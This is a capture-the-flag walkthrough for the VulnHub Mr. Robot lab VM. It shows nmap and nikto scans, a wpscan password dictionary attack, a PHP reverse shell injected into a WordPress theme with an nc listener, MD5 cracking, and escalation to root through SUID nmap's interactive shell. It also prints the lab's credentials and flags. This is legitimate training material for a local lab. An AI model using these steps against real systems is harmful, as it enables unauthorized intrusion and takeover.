# HAL 2020-03-03 - Mr. Robot

 * [Setup](#setup)
   * [Troubleshooting](#troubleshooting)
 * [The Challenge](#the-challenge)
   * [Reconnaissance + Flag #1](#reconnaissance-and-flag-1)
   * [Privilege Escalation](#privilege-escalation)
     * [Flag #2](#flag-2)
   * [Privilege Escalation II](#privilege-escalation-ii)
     * [Flag #3](#flag-3)

||||
|---|---|---|
|Info|https://www.vulnhub.com/entry/mr-robot-1,151/||
|Download| https://download.vulnhub.com/mrrobot/mrRobot.ova | This link doesn't work! Go to [Info](https://www.vulnhub.com/entry/mr-robot-1,151/) and use the download link on that page.|
|Torrent|https://download.vulnhub.com/mrrobot/mrRobot.ova.torrent||

## Setup

**Overview**: We are going setup and use two virtual machines in virtualbox

 * a kali linux VM which we will use as our 'workspace'
 * a challenge vm which we will try to attack

We will setup a private `NAT Network` between the two VM's such that they can communicate
with each other, but no one else on the network can talk to your VM's

**Steps:** To setup the two virtual machines:

 1. [Import kali linux VM](../instructions/setup-a-workspace-with-kali-linux.md)
 2. [Import Vulnerable VM](../instructions/import-vuln-vm.md)
 3. [Setup nat network](../instructions/setup-nat-network.md)
 4. Ensure both the Kali VM and the Vulnerable VM are using the nat network created in step 3.
 5. [Enable a network interface for kali](../instructions/kali-enable-eth0.md)

### Troubleshooting

**VM's are not visible to one another**

Ensure you [setup a NAT network](../instructions/setup-nat-network.md) and both
vm's are using the same NAT network.

**Kali Linux VM does not have IPv4 address**

If you are using a fresh VM make sure to [enable network interface for kali](../instructions/kali-enable-eth0.md)


# The Challenge

## Reconnaissance and Flag 1

In the previous section we setup a new ethernet and discovered our own IP address on our NAT Network.

Now we need to identify our target vulnerable VM. We can do this by scanning the network for other devices.

>**Warning!** Scanning networks, IP ranges or address that you do not have explicit permission to scan is considered abuse and may result in legal action against you.

Two tools which can help us do this are:

 * [netdiscover - active/passive ARP reconnaissance tool](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html)
 * [nmap -  network mapper](https://nmap.org/)

Use the `man` command to find out more about each tool. E.g. `man nmap`

**Scan IP range - disable port scan** 
```
root@kali:~# nmap -sn 10.0.2.*
```
or
```
root@kali:~# nmap -sn 10.0.2.0/24

Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 06:31 EST
Nmap scan report for 10.0.2.1
Host is up (0.00026s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.000095s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.3
Host is up (0.000070s latency).
MAC Address: 08:00:27:1D:F1:E5 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.5
Host is up (0.00029s latency).
MAC Address: 08:00:27:F9:B8:5B (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.15
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.16 seconds
```

>**Note:** `10.0.2.*` and `10.0.2.0/24` are both valid ways to specify all IP addresses which start with `10.0.2`

Since the device identified for `10.0.2.5` is *(Oracle VirtualBox virtual NIC)* which looks similar to our VM `10.0.2.15` let's examine that one further.

We can find out more about this particular host such as what services might be running on the host by using `nmap` again, without the `-sn` flag.

```
root@kali:~# nmap 10.0.2.5

Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 06:52 EST
Nmap scan report for 10.0.2.5
Host is up (0.00030s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:F9:B8:5B (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
```

nmap scanned the 1000 most common ports and found 3 network ports are open; `ssh` for remote access and `http`/`https` for serving websites.

Lets go see what websites are being served on that VM. Open a browser an `10.0.2.5` type the IP address into the Address bar.

There's a website being served here. One good thing to do when you find a website like this is check for a [robots.txt](https://www.robotstxt.org/) file. Most websites have one and they are often used to tell webcrawlers and search engines where **NOT** to look. Hmmm...

http://10.0.2.15/robots.txt

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Flag found!

http://10.0.2.15/key-1-of-3.txt

```
073403c8a58a1f80d943455fb30724b9
```

# Flag #2

Note theres also one other file listed in the `robots.txt` file. Let's save it for later

```
root@kali:~# curl http://10.0.2.5/fsocity.dic -o fsocity.dic
```

Let's find out more about this website. What is it? What does it do? Can we get access?

Tools:

 * [nikto](https://tools.kali.org/information-gathering/nikto)

>**Warning!** Scanning websites that you do not have explicit permission to scan is considered abuse and may result in legal action against you.

```
root@kali:~# nikto -h http://10.0.2.5:80

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.5
+ Target Hostname:    10.0.2.5
+ Target Port:        80
+ Start Time:         2020-01-16 00:18:42 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://10.0.2.5/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2020-01-16 00:24:17 (GMT-5) (335 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The results of the scan tell us it's a wordpress website.

```
+ /wordpress: A Wordpress installation was found.   
```

And that the wordpress website has login and admin login pages.

```
+ /wp-login/: Admin login page/section found.
+ /wp-admin/wp-login.php: Wordpress login found
```

We can visit the admin login page in our browser.

http://10.0.2.5/wp-login/

But we need a username and password to log in.

Tools:
 * [wpscan](https://wpscan.org/)

Finding a username.

Wordpress will helpfully tell us if a user exists or not. If we try to log in with
the username for a nonexistant user, wordpress will give us a different error message compared to if the username is correct.

We could sit and try entering usernames manually but wp-scan is capable of automating this for us with the `-e`/`--enumerate` option.

```
root@kali:~# wpscan --url http://10.0.2.5/ -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.6
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://10.0.2.5/
[+] Started: Mon Mar  2 07:36:32 2020

Interesting Finding(s):

[+] http://10.0.2.5/
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.0.2.5/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://10.0.2.5/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.0.2.5/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://10.0.2.5/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.22 identified (Latest, released on 2019-12-12).
 | Found By: Rss Generator (Aggressive Detection)
 |  - http://10.0.2.5/feed/, <generator>https://wordpress.org/?v=4.3.22</generator>
 |  - http://10.0.2.5/comments/feed/, <generator>https://wordpress.org/?v=4.3.22</generator>

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Mar  2 07:36:50 2020
[+] Requests Done: 457
[+] Cached Requests: 9
[+] Data Sent: 103.041 KB
[+] Data Received: 175.652 KB
[+] Memory used: 164.25 MB
[+] Elapsed time: 00:00:18
```

No success finding a username

```
[i] No Users Found.
```

>**Hint:** Try Username `Elliot`.
>Why elliot? Based on the theme of the challenge other participants found this user exists.

Finding a password.

We can try brute forcing the password using the fsocity.dic dictionary we found previously.

The dictionary contains a lot of duplicate values so to speed uo the process and reduce duplicate guesses lets strip out duplicate values.

```
root@kali:~# cat fsocity.dic | sort | uniq > fsocuniq.dic
```

Let's use the dictionary to do a dictionary attack against the `Elliot` user.

```
root@kali:~# wpscan --url http://10.0.2.5/ -U Elliot -P fsocuniq.dic
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.6
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

.
.
.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / ER28-0652
All Found
Progress Time: 00:00:51 <===================================

[i] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Mar  2 07:49:18 2020
[+] Requests Done: 65
[+] Cached Requests: 5
[+] Data Sent: 15.811 KB
[+] Data Received: 1.27 MB
[+] Memory used: 180.98 MB
[+] Elapsed time: 00:00:58
```

We found a match

```
[i] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```

|Username|Password|
|---|---|
|Elliot|ER28-0652|

Let's try login with those credentials. http://10.0.2.5/wp-login

Success! And we are an admin wordpress user.

## Reverse Shell

Wordpress provides a useful interface to allow adminstrators to edit the them in real time via the wordpress interface - since wordpress themes are just PHP files
this essentially means arbitrary code execution.

Terrible practice all around but very convenient for us. We can use the arbitrary code execution to setup a reverse shell and get access to the underlying VM.

Tools:
 * [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

[php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) is a useful script which lets us setup a reverse shell with minimal effort.

We'll make the code run by embedding it in the wordpress template for 404 pages. In the wordpress menu go to `Appearance` > `Editor` and select `404 Template (404.php)` from the list of templates on the right.

Copy and paste the [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) script into the 404 Template, overwriting all of the existing content.

We need to change the lines at the top of the script ending with `// CHANGE THIS`

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Change to the IP address to the IP address of our own kali VM which you can find by running `ifconfig eth0` again.

Leave `$port` as is.
```php
$ip = '10.0.2.15';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Save the template. When the script is run it will try to establish a TCP network connection to the configured ip address (`10.0.2.15`) and port (`1234`).

Before we trigger the script we need to configure our computer to listen for a connection on port `1234`.

Tools:
 * [netcat/nc - arbitrary TCP and UDP connections and listens](https://linux.die.net/man/1/nc)

Netcat, or `nc` for short, is a swiss army knife for all such networking tasks.

We will create a netcat listener to catch the connection from the wordpress site.

```
root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
```

Now, while the netcat listener is running trigger the reverse shell script by visiting a non existent URL on the website, causing wordpress to process the  `404 Template` with our reverse shell script.

http://10.0.2.5/idontexist

Check your netcat listener and see it's now connected!

```
root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 42478
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 13:31:05 up  2:08,  1 user,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
robot    tty1                      11:24    2:06m  0.08s  0.02s -bash
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Congratulations you now have an interactive reverse shell to the website. But what can we do with that?

## Privilege Escalation

We need to figure out what we can do on the server. Lets first check what user we are logged in as.

```
$ whoami  
daemon
```

Currently we are logged in as the daemon - the process which the website is running on. Good sysadmins normally try to minimize daemon processes access all unnecessary parts of the system so we could try switch to a different user.

Lets see what users have home folders on the server.

```
$ ls -Rhal /home/*
/home/robot:
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

There's one user with a home directory in `/home` called `robot`. We can also see `robot` has `key-2-of-3.txt` in their home folder.

```
$ cat /home/robot/key-2-of-3.txt
cat: /home/robot/key-2-of-3.txt: Permission denied
```

Unfortunately we can't read it. Based on the file permission (`-r--------`) only robot and no one else can read that file.

[Learn more: Linux File Permissions](http://linuxcommand.org/lc3_lts0090.php)

We can however read password.raw-md5 which has less restrictive file permissions (`-rw-r--r--`)



```
$ cat /home/robot/password.raw-md5              
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Based on the name of the file this looks like and MD5 hash of the `robot` user's password.

Thanks to ever advancing computing power MD5 hashes on their own are trivial crack. Ther are many websites which will do this for you for free and just googling the MD5 hash should give you the results from several of these such websites.

From my top google result:

>The MD5 hash:<br>
>c3fcd3d76192e4007dfb496cca67e13b<br>
>was succesfully reversed into the string:<br>
>abcdefghijklmnopqrstuvwxyz<br>

If we're unsure about the correctness of the result we can easily verify the result ourselves by hashing the result again and checking it matches the original 
hash.

```
root@kali:~# echo -n "abcdefghijklmnopqrstuvwxyz" | md5sum
c3fcd3d76192e4007dfb496cca67e13b
```

It's a match. If the file is what we think it is then we may have a username and password for the `robot` user.

|username|password|
|---|---|
|robot|abcdefghijklmnopqrstuvwxyz|

We can login as `robot` using `su`

```
$ su robot
su: must be run from a terminal 
```

To use `su` we need to be logged in to a TTY terminal which we currently are not.

No worries though! There's a myriad of ways we can get one detailed here https://netsec.ws/?p=337

We'll use this one

```
$ python -c 'import pty; pty.spawn("/bin/sh")'
$
```

In linux No news is good news - if we didn't see an error it was probably ok.

Lets try login as robot again.

```
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$
```

Sucess! We are logged in as Robot lets get that key!

```
robot@linux:/$ cat ~/key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

# Flag #3

## Privilege Escalation II

We managed to log in as a proper user on the server. Buy why stop now? We want `root`

Let's look for binaries with the [SUID bit](https://www.linuxnix.com/suid-set-suid-linuxunix/) set on their file permission

```bash
robot@linux:~$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Note nmap appers in the list of programs.
```
/usr/local/bin/nmap
```

From our list of ways to get TTY shells note that nmap, when run in in interactive mode can give us a shell as follows https://netsec.ws/?p=337

>(From within nmap)
>```
>!sh
>```
>


``` 
robot@linux:~$ /usr/local/bin/nmap --interactive 
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```

Spawn a shell

```
nmap> !sh 
!sh
# 
```

The `#` indicates we are now the `root` user. The key is probably stored in the `root` home directory found at `/root`

```
# ls /root
ls /root
firstboot_done  key-3-of-3.txt
```

```
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
